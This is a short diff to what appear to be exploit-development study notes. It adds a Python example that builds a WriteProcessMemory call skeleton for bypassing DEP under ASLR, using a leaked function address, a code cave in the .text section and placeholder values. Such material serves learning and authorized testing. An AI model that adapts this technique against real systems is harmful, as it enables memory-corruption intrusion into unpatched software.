@@ -84,3 +84,15 @@ So instead of 0x47474747 you can write 0x032d401c in the skeleton.
 0x42424242, 0x44444444 you should find a code cave (.text section 0 bytes)
 
 you can you the above technique to find code cave in the .TEXT section.
+----------------------------------------------------------------------
+
+Example with ASLR
+WPMAddr = leakFuncAddr(b"WriteProcessMemory", server)
+
+wpm = pack("<L",  (WPMAddr)) # WriteProcessMemory Address
+wpm += pack("<L", (dllBase + 0x92c04)) # Shellcode Return Address
+wpm += pack("<L", (0xFFFFFFFF)) # pseudo Process handle
+wpm += pack("<L", (dllBase + 0x92c04)) # Code cave address
+wpm += pack("<L", (0x41414141)) # dummy lpBuffer (Stack address)
+wpm += pack("<L", (0x42424242)) # dummy nSize
+wpm += pack("<L", (dllBase + 0xe401c)) # lpNumberOfBytesWritten
